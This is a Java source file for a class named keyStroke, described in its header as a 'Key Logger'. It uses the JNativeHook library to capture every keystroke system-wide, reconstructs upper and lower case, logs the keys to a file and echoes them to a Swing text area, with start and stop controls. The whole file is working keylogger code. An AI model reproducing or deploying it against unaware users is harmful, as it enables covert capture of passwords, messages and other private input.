package utility;

import java.awt.Toolkit;
import java.awt.event.KeyEvent;

import javax.swing.JTextArea;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import UI.MainUI;
import sun.applet.Main;

/**
 * @author avAnkyAnkit last modified @21-Mar-2018 @2:31:45 AM Key Logger - TODO
 */

public class keyStroke implements NativeKeyListener {

	private String lastKey = "";
	private String[] modifier_Keys = { "Shift", "Ctrl", "Alt", "Windows" };
	private FileReadWrite op;
	private boolean run;
	private long lastVisit;
	private JTextArea mFeed;

	public keyStroke(String path, FileReadWrite op, JTextArea mFeed) {
		this.op = op;
		this.mFeed = mFeed;
		// op = new FileReadWrite(path);
		mFeed.setText("");
		lastVisit = System.currentTimeMillis();
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		
		String addTofeed = "";
		String key = NativeKeyEvent.getKeyText(e.getKeyCode());
		 System.out.println("keyStroke" + key);
		if (!run)
			return;

		boolean isAlpha = key.charAt(0) >= 'A' && key.charAt(0) <= 'Z';
		if (key.length() == 1 && isAlpha) {
			boolean isShift = lastKey.equals("Shift");
			boolean isOn = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
			if ((isOn && isShift) || ((!isOn) && (!isShift))) {
				addTofeed = key.toLowerCase();
				op.add(key.toLowerCase());
			} else {
				long Delay = System.currentTimeMillis() - lastVisit;
				if (Delay <= 500) {
					addTofeed = key;
					op.add(key);
				} else {
					addTofeed = key.toLowerCase();
					op.add(key.toLowerCase());
				}
			}
		} else {
			addTofeed = key;
			op.add(key);
		}
		lastVisit = System.currentTimeMillis();
		this.lastKey = key;
		mFeed.append(addTofeed);
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {

	}

	/**
	 * @param key
	 * @return
	 */
	private boolean check(String key) {
		if (!lastKey.equals(key))
			return true;
		for (String mod_key : modifier_Keys) {
			if (key.equals(mod_key))
				return false;
		}
		return true;
	}

	public void start() {
		this.run = true;
		op.addTofile("Enter");
		op.addTofile("----------------------");
		op.addTofile("Enter");
	}

	public void stop() {
		this.run = false;
		op.addTofile("Enter");
	}

}
